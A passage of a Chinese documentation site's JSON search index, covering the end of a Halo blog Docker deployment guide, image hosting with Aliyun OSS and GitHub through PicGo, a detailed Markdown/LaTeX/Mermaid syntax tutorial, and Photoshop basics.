restart: unless-stopped environment: MYSQL_ROOT_PASSWORD: 'npm' MYSQL_DATABASE: 'npm' MYSQL_USER: 'npm' MYSQL_PASSWORD: 'npm' volumes: - ./data/mysql:/var/lib/mysql \"]},{\"header\":\"6.2.2 在当前目录运行以下命令安装此服务\",\"slug\":\"_6-2-2-在当前目录运行以下命令安装此服务\",\"contents\":[\"sudo docker-compose up -d #部署服务 \"]},{\"header\":\"6.2.3 安装完以后进入81端口登录\",\"slug\":\"_6-2-3-安装完以后进入81端口登录\",\"contents\":[\"默认登陆名和密码：\",\"Email: admin@example. com\",\"Password: changeme\",\"按如下图设置即可\",\"Halo博客搭建05.gif\",\"最后就可以通过域名进行访问了\"]},{\"header\":\"7. 开始写博客\",\"slug\":\"_7-开始写博客\",\"contents\":[\"配置好图床使用 GitHub 图床或阿里云对象存储搭建图床，使用 MarkDown 语法就可以愉快的发布文章啦!\"]}]},\"/software-tool/halo/\":{\"title\":\"Halo\",\"contents\":[]},\"/software-tool/image-hosting-website/01-%E9%98%BF%E9%87%8C%E4%BA%91%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A.html\":{\"title\":\"阿里云对象存储搭建图床\",\"contents\":[{\"header\":\"1. 开通阿里云对象存储服务\",\"slug\":\"_1-开通阿里云对象存储服务\",\"contents\":[\"进入官网，开通阿里云对象存储服务\"]},{\"header\":\"2. 创建Bucket\",\"slug\":\"_2-创建bucket\",\"contents\":[\"进入控制台，选择 Bucket 列表，创建 Bucket\",\"阿里云对象存储搭建图床01.png\",\"填写信息\",\"注意：存储类型选择标准存储、读写权限选择公共读\",\"阿里云对象存储搭建图床02.png\",\"然后点击设置的 Bucket，然后点击 Bucket 下的概览\",\"在 访问域名 一栏找到你的地域节点，后面会用到\",\"阿里云对象存储搭建图床03.png\"]},{\"header\":\"3. 管理Accesskey\",\"slug\":\"_3-管理accesskey\",\"contents\":[\"点击头像，选择 Accesskey 管理\",\"阿里云对象存储搭建图床04.png\",\"在弹出的选项框里，选择“继续使用”\",\"进入后，创建一个 AccessKey\",\"在弹出的界面里，记住你的 accessKeyId 和 accessKeySecret\"]},{\"header\":\"4. 购买存储包\",\"slug\":\"_4-购买存储包\",\"contents\":[\"阿里云对象存储搭建图床05.png\",\"购买完成后还要充值余额，即需要购买流量\"]},{\"header\":\"5. 配置PicGo\",\"slug\":\"_5-配置picgo\",\"contents\":[\"下载 PicGo，官网 PicGo，安装完成\",\"打开图床设置\",\"在图床设置里面选择阿里云 OSS，依照以下步骤填写信息：\",\"设定 KeyId：填写刚刚获得的 AccessKeyID\",\"设定 KeySecret：填写 AccessKeyIDSecret\",\"设定储存空间名：填写 bucket 名称，这里填写的是 bucket 名称，不是浏览器里的域名\",\"确认存储区域：填写你的地域节点，注意复制的格式\",\"指定存储路径：其实就是自定义一个文件夹的名字，以/结尾\",\"阿里云对象存储搭建图床06.png\",\"它会自动在你的 bucket 里面创建一个文件夹，并把图片上传进去\"]}]},\"/software-tool/image-hosting-website/02-GitHub%E5%9B%BE%E5%BA%8A.html\":{\"title\":\"GitHub图床\",\"contents\":[{\"header\":\"1. 创建一个仓库\",\"slug\":\"_1-创建一个仓库\",\"contents\":[\"首先创建一个仓库\",\"GitHub图床01.png\"]},{\"header\":\"2. 设置token\",\"slug\":\"_2-设置token\",\"contents\":[\"点击头像，点击设置\",\"GitHub图床02.png\",\"点击开发者设置\",\"GitHub图床03.png\",\"设置个人访问令牌\",\"GitHub图床04.png\",\"设置完成以后请务必复制并保存 token\"]},{\"header\":\"3. 下载PicGo\",\"slug\":\"_3-下载picgo\",\"contents\":[\"官网 PicGo下载完成并安装\"]},{\"header\":\"4. 设置GitHub图床\",\"slug\":\"_4-设置github图床\",\"contents\":[\"GitHub图床05.png\",\"确定即可，上传图片验证是否成功\",\"注意：如果上传失败，请关闭加速器\"]}]},\"/software-tool/image-hosting-website/\":{\"title\":\"图床\",\"contents\":[]},\"/software-tool/markdown/01-MarkDown%E8%AF%AD%E6%B3%95.html\":{\"title\":\"MarkDown语法\",\"contents\":[{\"header\":\"1. 标题\",\"slug\":\"_1-标题\",\"contents\":[\"# 标题名字（井号的个数代表标题的级数） \",\"一级标题使用 1 个#\",\"二级标题使用 2 个#\",\"三级标题使用 3 个#\",\"四级标题使 4 用个#\",\"五级标题使用 5 个#\",\"六级标题使用 6 个#\",\"最多支持六级标题#\"]},{\"header\":\"2. 文字相关\",\"slug\":\"_2-文字相关\",\"contents\":[]},{\"header\":\"2.1 删除线\",\"slug\":\"_2-1-删除线\",\"contents\":[\"这就是 ~~删除线~~ (使用波浪号) \",\"这就是 删除线 (使用波浪号)\"]},{\"header\":\"2.2 斜体\",\"slug\":\"_2-2-斜体\",\"contents\":[\"这是用来 *斜体* 的 _文本_ \",\"这是用来 斜体 的 文本\"]},{\"header\":\"2.3 加粗\",\"slug\":\"_2-3-加粗\",\"contents\":[\"这是用来 **加粗** 的 __文本__ \",\"这是用来 加粗 的 文本\"]},{\"header\":\"2.4 斜体+加粗\",\"slug\":\"_2-4-斜体-加粗\",\"contents\":[\"这是用来 ***斜体+加粗*** 的 ___文本___ \",\"这是用来 斜体+加粗 的 文本\"]},{\"header\":\"2.5 下划线\",\"slug\":\"_2-5-下划线\",\"contents\":[\"下划线是 HTML 语法\",\"<u>下划线</u> \",\"下划线\",\"快捷键： ctrl + u\"]},{\"header\":\"2.6 高亮\",\"slug\":\"_2-6-高亮\",\"contents\":[\"这是用来 ==高亮== 的文本 \",\"这是用来 高亮 的文本\"]},{\"header\":\"3. 符号及数学公式\",\"slug\":\"_3-符号及数学公式\",\"contents\":[]},{\"header\":\"3.1 下标\",\"slug\":\"_3-1-下标\",\"contents\":[\"水 $H_2O$ 双氧水 $H_2O_2$ \",\"水 H2​O 双氧水 H2​O2​\"]},{\"header\":\"3.2 上标\",\"slug\":\"_3-2-上标\",\"contents\":[\"面积 $m^2$ 体积 $m^3$ 3的xy次方 $3^{xy}$ \",\"面积 m2 体积 m3 3 的 xy 次方 3xy\"]},{\"header\":\"3.3 运算符\",\"slug\":\"_3-3-运算符\",\"contents\":[\"乘号: $\\\\times$ $10 = 2 \\\\times 5$ 除号: $\\\\div$ 加减号: $\\\\pm$ 开方：$\\\\sqrt{ x }$ 开n次方：$\\\\sqrt[ n ]{ x }$ \",\"乘号: ×10=2×5 除号: ÷ 加减号: ± 开方：x​ 开 n 次方：nx​\",\"把符号往正上方或者正下方放\",\"比如 :\",\"$\\\\max \\\\limits_{x_0}$ $\\\\min \\\\limits^{x_0}$ $\\\\min \\\\limits^{x_0}_{x_0}$ \",\"x0​max​minx0​x0​minx0​​\",\"limits 只允许用于运算符上, 其他的不行\"]},{\"header\":\"3.4 向量\",\"slug\":\"_3-4-向量\",\"contents\":[\"$\\\\vec{ a }$ $\\\\vec a \\\\cdot \\\\vec b = 0$ \",\"aa⋅b=0\"]},{\"header\":\"3.5 微积分\",\"slug\":\"_3-5-微积分\",\"contents\":[\"$\\\\int_0^2 x^2 {\\\\rm d}x$ $\\\\lim\\\\limits_{n \\\\rightarrow +\\\\infty} \\\\frac{1}{n(n+1)}$ \",\"∫02​x2dxn→+∞lim​n(n+1)1​\"]},{\"header\":\"3.6 求和求极限\",\"slug\":\"_3-6-求和求极限\",\"contents\":[\"$\\\\sum_{i = 1}^n{x_i}$ $\\\\sum\\\\limits_{i = 1}^n{x_i}$ $\\\\sum_{i=0}^n \\\\frac{1}{i^2}$ $\\\\sum\\\\limits_{i=0}^n \\\\frac{1}{i^2}$ $\\\\frac{\\\\sum_{i = 1}^n{x_i}}{n}$ $\\\\prod_{i=0}^n \\\\frac{1}{i^2}$ \",\"∑i=1n​xi​i=1∑n​xi​∑i=0n​i21​i=0∑n​i21​n∑i=1n​xi​​∏i=0n​i21​\"]},{\"header\":\"3.7 括号\",\"slug\":\"_3-7-括号\",\"contents\":[\"$\\\\{ \\\\}$ ${a\\\\choose b}$ $\\\\frac{x}{y}$ $\\\\left ()\\\\right.$ \",\"{}(ba​)yx​()\"]},{\"header\":\"3.8 省略号\",\"slug\":\"_3-8-省略号\",\"contents\":[\"跟文本底线对齐的省略号 $\\\\ldots$ 横向的省略号 $\\\\cdots$ 竖向的省略号 $\\\\vdots$ 对角线方向的省略号 $\\\\ddots$ \",\"跟文本底线对齐的省略号 … 横向的省略号 ⋯ 竖向的省略号 ⋮ 对角线方向的省略号 ⋱\"]},{\"header\":\"3.9 数学符号\",\"slug\":\"_3-9-数学符号\",\"contents\":[\"因为：$\\\\because$ 所以：$\\\\therefore$ 任意：$\\\\forall$ 存在：$\\\\exists$ ∣ ：$\\\\mid$ \\\\ ：$\\\\backslash$ ∗ ：$\\\\ast$ ≤ ：$\\\\leq$ ≥ ：$\\\\geq$ ≠ ：$\\\\neq$ ≈ ：$\\\\approx$ ≡ ：$\\\\equiv$ ∑ ：$\\\\sum$ ∏ ：$\\\\prod$ ∐ ：$\\\\coprod$ ⨀ ：$\\\\bigodot$ ⨂ ：$\\\\bigotimes$ ⨁ ：$\\\\bigoplus$ \",\"因为：∵ 所以：∴ 任意：∀ 存在：∃ ∣ ：∣ \\\\ ：\\\\ ∗ ：∗ ≤ ：≤ ≥ ：≥ ≠ ：= ≈ ：≈ ≡ ：≡ ∑ ：∑ ∏ ：∏ ∐ ：∐ ⨀ ：⨀ ⨂ ：⨂ ⨁ ：⨁\"]},{\"header\":\"3.10 百分号、约等号\",\"slug\":\"_3-10-百分号、约等号\",\"contents\":[\"$\\\\%$ $\\\\approx$ \",\"%≈\"]},{\"header\":\"3.11 向上/下取整\",\"slug\":\"_3-11-向上-下取整\",\"contents\":[\"向上: $\\\\lceil$ $\\\\rceil$ 向下: $\\\\lfloor$ $\\\\rfloor$ $\\\\lceil$\\\\frac{4}{5}$\\\\rceil$ $\\\\lfloor$\\\\frac{4}{5}$\\\\rfloor$ \",\"向上:\",\"⌈⌉\",\"向下:\",\"⌊⌋\",\"⌈54​⌉⌊54​⌋\"]},{\"header\":\"3.12 希腊字母\",\"slug\":\"_3-12-希腊字母\",\"contents\":[\"希腊字母\",\"写法\",\"希腊字母\",\"写法\",\"α\",\"$\\\\alpha$\",\"β\",\"$\\\\beta$\",\"γ\",\"$\\\\gamma$\",\"Γ\",\"$\\\\Gamma$\",\"δ\",\"$\\\\delta$\",\"Δ\",\"$\\\\Delta$\",\"ϵ\",\"$\\\\epsilon$\",\"ε\",\"$\\\\varepsilon$\",\"ζ\",\"$\\\\zeta$\",\"η\",\"$\\\\eta$\",\"θ\",\"$\\\\theta$\",\"Θ\",\"$\\\\Theta$\",\"ϑ\",\"$\\\\vartheta$\",\"ι\",\"$\\\\iota$\",\"κ\",\"$\\\\kappa$\",\"λ\",\"$\\\\lambda$\",\"Λ\",\"$\\\\Lambda$\",\"μ\",\"$\\\\mu$\",\"ν\",\"$\\\\nu$\",\"ξ\",\"$\\\\xi$\",\"Ξ\",\"$\\\\Xi$\",\"π\",\"$\\\\pi$\",\"Π\",\"$\\\\Pi$\",\"ϖ\",\"$\\\\varpi$\",\"ρ\",\"$\\\\rho$\",\"ϱ\",\"$\\\\varrho$\",\"σ\",\"$\\\\sigma$\",\"Σ\",\"$\\\\Sigma$\",\"ς\",\"$\\\\varsigma$\",\"τ\",\"$\\\\tau$\",\"υ\",\"$\\\\upsilon$\",\"Υ\",\"$\\\\Upsilon$\",\"ϕ\",\"$\\\\phi$\",\"Φ\",\"$\\\\Phi$\",\"φ\",\"$\\\\varphi$\",\"χ\",\"$\\\\chi$\",\"ψ\",\"$\\\\psi$\",\"Ψ\",\"$\\\\Psi$\",\"Ω\",\"$\\\\Omega$\",\"ω\",\"$\\\\omega$\"]},{\"header\":\"3.13 集合运算符\",\"slug\":\"_3-13-集合运算符\",\"contents\":[\"∅: $\\\\emptyset$ ∈: $\\\\in$ ∉: $\\\\notin$ ⊂: $\\\\subset$ ⊃: $\\\\supset$ ⊆: $\\\\subseteq$ ⊇: $\\\\supseteq$ ⋂: $\\\\bigcap$ ⋃: $\\\\bigcup$ ⋁: $\\\\bigvee$ ⋀: $\\\\bigwedge$ ⨄: $\\\\biguplus$ ⨆: $\\\\bigsqcup$ $A\\\\\\\\2$ \",\"∅: ∅ ∈: ∈ ∉: ∈/ ⊂: ⊂ ⊃: ⊃ ⊆: ⊆ ⊇: ⊇ ⋂: ⋂ ⋃: ⋃ ⋁: ⋁ ⋀: ⋀ ⨄: ⨄ ⨆: ⨆A2\"]},{\"header\":\"3.14 对数符号\",\"slug\":\"_3-14-对数符号\",\"contents\":[\"log:$\\\\log$ lg:$\\\\lg$ ln:$\\\\ln$ \",\"log: log lg: lg ln: ln\"]},{\"header\":\"3.15 箭头符号\",\"slug\":\"_3-15-箭头符号\",\"contents\":[\"↑:$\\\\uparrow$ ↓:$\\\\downarrow$ ⇑:$\\\\Uparrow$ ⇓:$\\\\Downarrow$ →:$\\\\rightarrow$ ←:$\\\\leftarrow$ ⇒:$\\\\Rightarrow$ ⇐:$\\\\Leftarrow$ ⟶:$\\\\longrightarrow$ ⟵:$\\\\longleftarrow$ ⟹:$\\\\Longrightarrow$ ⟸:$\\\\Longleftarrow$ $\\\\stackrel{+}{\\\\Rightarrow}$ $\\\\stackrel{*}{\\\\Rightarrow}$ \",\"↑: ↑ ↓: ↓ ⇑: ⇑ ⇓: ⇓ →: → ←: ← ⇒: ⇒ ⇐: ⇐ ⟶: ⟶ ⟵: ⟵ ⟹: ⟹ ⟸: ⟸⇒+⇒∗\"]},{\"header\":\"3.16 三角运算符\",\"slug\":\"_3-16-三角运算符\",\"contents\":[\"⊥:$\\\\bot$ ∠:$\\\\angle$ 度数:$30^\\\\circ$ sin:$\\\\sin$ cos:$\\\\cos$ tan:$\\\\tan$ cot:$\\\\cot$ sec:$\\\\sec$ csc:$\\\\csc$ \",\"⊥: ⊥ ∠: ∠ 度数: 30∘ sin: sin cos: cos tan: tan cot: cot sec: sec csc: csc\"]},{\"header\":\"3.17 分段函数的写法\",\"slug\":\"_3-17-分段函数的写法\",\"contents\":[\"用法：\\\\begin{cases}xxxxxxx \\\\\\\\ xxxxxxx \\\\end{cases}\",\"$L(Y,f(x))=\\\\begin{cases}1, Y!=f(x) \\\\\\\\0, Y = f(x)\\\\end{cases}$ \",\"L(Y,f(x))={1,Y!=f(x)0,Y=f(x)​\",\"$L(Y,f(x))=\\\\begin{cases}1, Y!=f(x) \\\\\\\\0, Y = f(x)\\\\\\\\ -1,Y=\\\\infty \\\\end{cases}$ \",\"L(Y,f(x))=⎩⎨⎧​1,Y!=f(x)0,Y=f(x)−1,Y=∞​\",\"$M_p=\\\\begin{cases}x_{([np]+1)} {\\\\quad}{\\\\quad} np不是整数 \\\\\\\\ \\\\frac{1}{2}(x_{(np)}+x_{(np+1)}) {\\\\quad}{\\\\quad} np为整数\\\\end{cases}$ \",\"Mp​={x([np]+1)​np不是整数21​(x(np)​+x(np+1)​)np为整数​\"]},{\"header\":\"3.18 在数学公式中加空格\",\"slug\":\"_3-18-在数学公式中加空格\",\"contents\":[\"${\\\\quad}$ : 输出一个空格\",\"${\\\\,}$ : 输出半个空格\",\"在数学模式下如果输不出空格就先加大括号 {}; 在复杂的公式下可能识别不出, 就需要加 {}\",\"空格宽度\",\"写法\",\"示例 : x y\",\"两个空格\",\"$x \\\\qquad y$\",\"xy\",\"一个空格\",\"$x \\\\quad y$\",\"xy\",\"大空格\",\"$x \\\\ y$\",\"xy\",\"中等空格\",\"$x \\\\; y$\",\"xy\",\"小空格\",\"$x\\\\,y$\",\"xy\",\"紧贴\",\"$x\\\\!y$\",\"xy\"]},{\"header\":\"3.19 绝对值\",\"slug\":\"_3-19-绝对值\",\"contents\":[\"$|\\\\overline{x}|$ $|x|$ \",\"∣x∣∣x∣\"]},{\"header\":\"3.20 输出矩阵\",\"slug\":\"_3-20-输出矩阵\",\"contents\":[\"$\\\\begin{matrix} 1 & 2 & 3 \\\\\\\\ 4 & 5 & 6 \\\\\\\\ 7 & 8 & 9 \\\\end{matrix}$ \\\\\\\\:换行 \",\"147​258​369​\"]},{\"header\":\"3.20.1 带大圆括号的矩阵\",\"slug\":\"_3-20-1-带大圆括号的矩阵\",\"contents\":[\"$\\\\left( \\\\begin{matrix} 1 & 2 & 3 \\\\\\\\ 4 & 5 & 6 \\\\\\\\ 7 & 8 & 9 \\\\end{matrix} \\\\right)$ \",\"​147​258​369​​\",\"格式 : \\\\left( : 代表左圆括号 \\\\right) : 代表右圆括号\"]},{\"header\":\"3.20.2 带中/方括号的矩阵\",\"slug\":\"_3-20-2-带中-方括号的矩阵\",\"contents\":[\"$\\\\left[ \\\\begin{matrix} 1 & 2 & 3 \\\\\\\\ 4 & 5 & 6 \\\\\\\\ 7 & 8 & 9 \\\\end{matrix} \\\\right]$ \",\"​147​258​369​​\",\"格式 : \\\\left[ : 代表左中括号 \\\\right] : 代表右中括号\"]},{\"header\":\"3.20.3 带大括号的矩阵\",\"slug\":\"_3-20-3-带大括号的矩阵\",\"contents\":[\"$\\\\left\\\\{ \\\\begin{matrix} 1 & 2 & 3 \\\\\\\\ 4 & 5 & 6 \\\\\\\\ 7 & 8 & 9 \\\\end{matrix} \\\\right\\\\}$ \",\"⎩⎨⎧​147​258​369​⎭⎬⎫​\",\"格式 : \\\\left\\\\{ : 代表左大括号 \\\\right\\\\} : 代表右大括号\"]},{\"header\":\"3.21 阵列\",\"slug\":\"_3-21-阵列\",\"contents\":[\"$\\\\begin{array}{c|ccc} {↓}&{a}&{b}&{c}\\\\\\\\ \\\\hline {R_1}&{c}&{b}&{a}\\\\\\\\ {R_2}&{b}&{c}&{c}\\\\\\\\ \\\\end{array}$ \",\"↓R1​R2​​acb​bbc​cac​​\",\"需要 array 环境：起始、结束处以 {array} 声明\",\"对齐方式：在{array}后以 \",\"左对齐：l ；剧中：c；右对齐：r\",\"竖直线：在声明对齐方式时，插入 | 建立竖直线\",\"$\\\\begin{array}{r|c|c|l|} {p}&{x}&{y}&{z}\\\\\\\\ \\\\hline {R_1}&{1}&{2}&{3}\\\\\\\\ {R_2}&{3}&{2}&{1}\\\\\\\\ \\\\end{array}$ \",\"pR1​R2​​x13​y22​z31​​\"]},{\"header\":\"3.22 公式推导\",\"slug\":\"_3-22-公式推导\",\"contents\":[\"$\\\\begin {aligned} 推导内容1 &\\\\Rightarrow 推导内容2 \\\\\\\\ &\\\\Rightarrow 推导内容3 \\\\\\\\ &\\\\Rightarrow 推导内容4 \\\\end {aligned}$ \",\"推导内容1​⇒推导内容2⇒推导内容3⇒推导内容4​\",\"& 符号对齐列, \\\\\\\\符号换行, \\\\ 转义作用\",\"$\\\\begin {aligned} 式子1 &= 式子2 \\\\\\\\ &= 式子3 \\\\\\\\ &= 式子4 \\\\end {aligned}$ \",\"式子1​=式子2=式子3=式子4​\"]},{\"header\":\"3.23 回归方程符号\",\"slug\":\"_3-23-回归方程符号\",\"contents\":[\"样式\",\"写法\",\"样式\",\"写法\",\"xˉ\",\"$\\\\bar{x}$\",\"ηˋ​\",\"$\\\\grave{\\\\eta}$\",\"x˙\",\"$\\\\dot{x}$\",\"a˘\",\"$\\\\breve{a}$\",\"α^\",\"$\\\\hat{\\\\alpha}$\",\"αˇ\",\"$\\\\check{\\\\alpha}$\",\"y¨​\",\"$\\\\ddot{y}$\",\"ι~\",\"$\\\\tilde{\\\\iota}$\",\"ηˊ​\",\"$\\\\acute{\\\\eta}$\"]},{\"header\":\"4. 表格\",\"slug\":\"_4-表格\",\"contents\":[\"使用 | 来分隔不同的单元格，使用 - 来分隔表头和其他行：\",\"| 名称 | 价格 | | ---- | ---- | | 炸鸡 | 19 | | 可乐 | 5 | \",\"为了使 Markdown 更清晰，| 和 - 两侧需要至少有一个空格（最左侧和最右侧的 | 外就不需要了）\",\"名称\",\"价格\",\"炸鸡\",\"19\",\"可乐\",\"5\",\"为了美观，可以使用空格对齐不同行的单元格，并在左右两侧都使用 | 来标记单元格边界，在表头下方的分隔线标记中加入 :，即可标记下方单元格内容的对齐方式：\",\"| 名称 | 价格 | | :------------ | :---: | | 炸鸡 | 19 | | 可乐 | 32 | \",\"名称\",\"价格\",\"炸鸡\",\"19\",\"可乐\",\"32\",\"若想对一段长文本进行换行，可以在 中间 插入一个 <br>（换行标签)\"]},{\"header\":\"5. 引用\",\"slug\":\"_5-引用\",\"contents\":[\">“大风起兮云飞扬” \",\"“大风起兮云飞扬”\",\">也可以在引用中 >>使用嵌套的引用 \",\"也可以在引用中\",\"使用嵌套的引用\"]},{\"header\":\"6. 列表\",\"slug\":\"_6-列表\",\"contents\":[]},{\"header\":\"6.1 无序列表\",\"slug\":\"_6-1-无序列表\",\"contents\":[\"* 可以使用 `*` 作为标记 + 也可以使用 `+` - 或者 `-` + 使用tab键可以使用多级列表 \",\"可以使用 * 作为标记\",\"也可以使用 +\",\"或者 -\",\"使用 tab 键可以使用多级列表\"]},{\"header\":\"6.2 有序列表\",\"slug\":\"_6-2-有序列表\",\"contents\":[\"1. 有序列表以数字和 `.` 开始 3. 数字的序列并不会影响生成的列表序列 4. 但仍然推荐按照自然顺序（1.2.3...）编写 \",\"有序列表以数字和 . 开始\",\"数字的序列并不会影响生成的列表序列\",\"但仍然推荐按照自然顺序（1.2.3...）编写\",\"可以使用：数字\\\\. 来取消显示为列表（用反斜杠进行转义）\"]},{\"header\":\"7. 代码\",\"slug\":\"_7-代码\",\"contents\":[]},{\"header\":\"7.1 代码块\",\"slug\":\"_7-1-代码块\",\"contents\":[\"```语言 代码 \",\"代码 \"]},{\"header\":\"7.2 行内代码\",\"slug\":\"_7-2-行内代码\",\"contents\":[\"可以通过``，插入行内代码（`是Tab键上边、数字1键左侧的那个按键） `Markdown` \",\"Markdown\"]},{\"header\":\"7.3 转换规则\",\"slug\":\"_7-3-转换规则\",\"contents\":[\"代码块中的文本（包括 Markdown 语法）都会显示为原始内容\"]},{\"header\":\"8. 分隔线\",\"slug\":\"_8-分隔线\",\"contents\":[\"可以在一行中使用三个或更多的 *、- 或 _ 来添加分隔线：\",\"*** ------ ___ \"]},{\"header\":\"9. 待办事项\",\"slug\":\"_9-待办事项\",\"contents\":[\"- [ ] \",\"[ ]\",\"[x]\"]},{\"header\":\"10. 空格\",\"slug\":\"_10-空格\",\"contents\":[\"在一些编辑器或者支持markdown的笔记软件里，无论你打多少个空格，它只会显示单个空格的距离\",\"可以使用 HTML 中空格的字符实体——&nbsp;\",\"若要添加多个空格，就输入多个——&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\",\"例如：\",\"这里有&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6个空格分隔 \",\"结果： 这里有 6 个空格分隔\"]},{\"header\":\"11. 链接\",\"slug\":\"_11-链接\",\"contents\":[]},{\"header\":\"11.1 超链接\",\"slug\":\"_11-1-超链接\",\"contents\":[\"格式为 [link text](link)\",\"[帮助文档](https://support.typora.io/Links/#faq) \",\"帮助文档\"]},{\"header\":\"11.2 自动链接\",\"slug\":\"_11-2-自动链接\",\"contents\":[\"使用<>包括的 URL 或邮箱地址会被自动转换为超链接\",\"<https://www.baidu.com> <123@email.com> \",\"https://www.baidu.com\",\"123@email.com\"]},{\"header\":\"12. 图片\",\"slug\":\"_12-图片\",\"contents\":[\"![自己起的图片名字](图片地址或者图片本地存储的路径) \"]},{\"header\":\"12.1 网上的图片\",\"slug\":\"_12-1-网上的图片\",\"contents\":[\"![炸鸡](https://ss0.bdstatic.com/94oJfD_bAAcT8t7mm9GUKT-xh_/timg?image&quality=100&size=b4000_4000&sec=1580814517&di=2630beac440e5dab0e44c7286a3b2b61&src=http://imgsrc.baidu.com/forum/w=580/sign=12c730c4ff03738dde4a0c2a831ab073/9497794f9258d1091818e6d6d858ccbf6d814d1b.jpg) \",\"炸鸡\"]},{\"header\":\"12.2 本地图片\",\"slug\":\"_12-2-本地图片\",\"contents\":[\"![美食](美食.jpg) 在同一个文件夹里（用相对路径） 或者直接拷贝 \"]},{\"header\":\"13. 画图\",\"slug\":\"_13-画图\",\"contents\":[\"markdown 画图也是轻量级的，功能并不全\",\"Mermaid 是一个用于画流程图、状态图、时序图、甘特图的库，使用 JS 进行本地渲染，广泛集成于许多 Markdown 编辑器中\",\"Mermaid 作为一个使用 JS 渲染的库，生成的不是一个“图片”，而是一段 HTML 代码（不同的编辑器渲染的可能不一样）\"]},{\"header\":\"13.1 流程图 (graph)\",\"slug\":\"_13-1-流程图-graph\",\"contents\":[]},{\"header\":\"13.1.1 概述\",\"slug\":\"_13-1-1-概述\",\"contents\":[\"graph 方向描述 图表中的其他语句... \",\"关键字 graph 表示一个流程图的开始，同时需要指定该图的方向\",\"其中“方向描述”为：\",\"用词\",\"含义\",\"TB\",\"从上到下\",\"BT\",\"从下到上\",\"RL\",\"从右到左\",\"LR\",\"从左到右\",\"T = TOP，B = BOTTOM，L = LEFT，R = RIGHT，D = DOWN\",\"最常用的布局方向是 TB、LR\",\"graph TB; A-->B B-->C C-->A \",\"graph LR; A-->B B-->C C-->A \"]},{\"header\":\"13.1.2 节点形状\",\"slug\":\"_13-1-2-节点形状\",\"contents\":[\"表述\",\"说明\",\"含义\",\"id[文字]\",\"矩形节点\",\"表示过程，也就是整个流程中的一个环节\",\"id (文字)\",\"圆角矩形节点\",\"表示开始和结束\",\"id ((文字))\",\"圆形节点\",\"表示连接。为避免流程过长或有交叉，可将流程切开。成对\",\"id\",\"菱形节点\",\"表示判断、决策\",\"id>文字]\",\"右向旗帜状节点\",\"单向箭头线段：表示流程进行方向\",\"id 即为节点的唯一标识，A~F 是当前节点名字，类似于变量名，画图时便于引用\",\"括号内是节点中要显示的文字，默认节点的名字和显示的文字都为 A\",\"graph TB A B(圆角矩形节点) C[矩形节点] D((圆形节点)) E{菱形节点} F>右向旗帜状节点] \",\"graph TB begin(出门)--> buy[买东西] buy --> IsRemaining{\\\"没有？\\\"} IsRemaining -->|有|happy[买到了开心]--> goBack(回家) IsRemaining --没有--> sad[\\\"伤心\\\"]--> goBack \"]},{\"header\":\"13.1.3 连线\",\"slug\":\"_13-1-3-连线\",\"contents\":[\"graph TB A1-->B1 A2---B2 A3--text---B3 A4--text-->B4 A5-.-B5 A6-.->B6 A7-.text.-B7 A8-.text.->B8 A9===B9 A10==>B10 A11==text===B11 A12==text==>B12 \"]},{\"header\":\"13.1.4 子图表\",\"slug\":\"_13-1-4-子图表\",\"contents\":[\"使用以下语法添加子图表\",\"subgraph 子图表名称 子图表中的描述语句... end \",\"graph TB subgraph 买东西前 begin(出门)--> buy[出门买东西] end buy --> IsRemaining{\\\"还有没有？\\\"} IsRemaining --没有--> sad[\\\"伤心\\\"]--> goBack(回家) IsRemaining -->|有|happy[买到啦]--> goBack \"]},{\"header\":\"13.2 饼图（Pie）\",\"slug\":\"_13-2-饼图-pie\",\"contents\":[\"pie title 销售图 \\\"苹果\\\" : 100 \\\"橘子\\\" : 200.4 \\\"香蕉\\\" : 50 \"]},{\"header\":\"13.3 甘特图（gantt）\",\"slug\":\"_13-3-甘特图-gantt\",\"contents\":[\" title 标题 dateFormat 日期格式 section 部分名 任务名:参数一, 参数二, 参数三, 参数四，参数五 //参数一：crit（是否重要，红框框） 或者 不填 //参数二：done（已完成）、active（正在进行） 或者 不填(表示为待完成状态) //参数三：取小名 或者 不填 //参数四：任务开始时间 //参数五：任务结束时间 \",\"官方教程\",\"gantt dateFormat YYYY-MM-DD title Adding GANTT diagram functionality to mermaid section A section Completed task :done, des1, 2014-01-06,2014-01-08 Active task :active, des2, 2014-01-09, 3d Future task : des3, after des2, 5d Future task2 : des4, after des3, 5d section Critical tasks Completed task in the critical line :crit, done, 2014-01-06,24h Implement parser and jison :crit, done, after des1, 2d Create tests for parser :crit, active, 3d Future task in critical line :crit, 5d Create tests for renderer :2d Add to mermaid :1d section Documentation Describe gantt syntax :active, a1, after des1, 3d Add gantt diagram to demo page :after a1 , 20h Add another diagram to demo page :doc1, after a1 , 48h section Last section Describe gantt syntax :after doc1, 3d Add gantt diagram to demo page :20h Add another diagram to demo page :48h \"]}]},\"/software-tool/markdown/\":{\"title\":\"MarkDown\",\"contents\":[]},\"/software-tool/photoshop/01-Photoshop%E5%9F%BA%E7%A1%80.html\":{\"title\":\"Photoshop基础\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"部分操作：\",\"文件→打开 ：可以打开我们要测量的图片\",\"Ctrl+R：可以打开标尺，或者视图→标尺\",\"右击标尺，把里面的单位改为像素\",\"Ctrl+ 加号 (+)可以放大视图， Ctrl+ 减号 (-)可以缩小视图\",\"按住空格键，鼠标可以变成小手，拖动 PS 视图\",\"用选区拖动可以测量大小\",\"Ctrl+ D 可以取消选区，或者在旁边空白处点击一下也可以取消选区\"]}]},\"/software-tool/photoshop/02-PS%E5%88%87%E5%9B%BE.html\":{\"title\":\"PS切图\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"PS 有很多的切图方式：图层切图、切片切图、PS 插件切图等\"]},{\"header\":\"1. 图层切图\",\"slug\":\"_1-图层切图\",\"contents\":[\"简单版步骤：\",\"使用移动工具，点击需要的图片\",\"查看右侧，找到图片对应的图层，右击图层 → 快速导出为 PNG\",\"但是很多情况下, 我们需要合并图层再导出:\",\"步骤：\",\"选中需要的若干个图层：选择一个图层，再按住 shift 键，继续选第二个图层\",\"然后选择图层菜单 → 合并图层 (ctrl+e)\",\"查看右侧生成的新图层，在合并后的图层上，右击 → 快速导出为 PNG\"]},{\"header\":\"2. 切片切图\",\"slug\":\"_2-切片切图\",\"contents\":[\"步骤：\",\"利用切片选中图片：利用切片工具手动划出\",\"导出选中的图片：文件菜单 → 导出 → 存储为 web 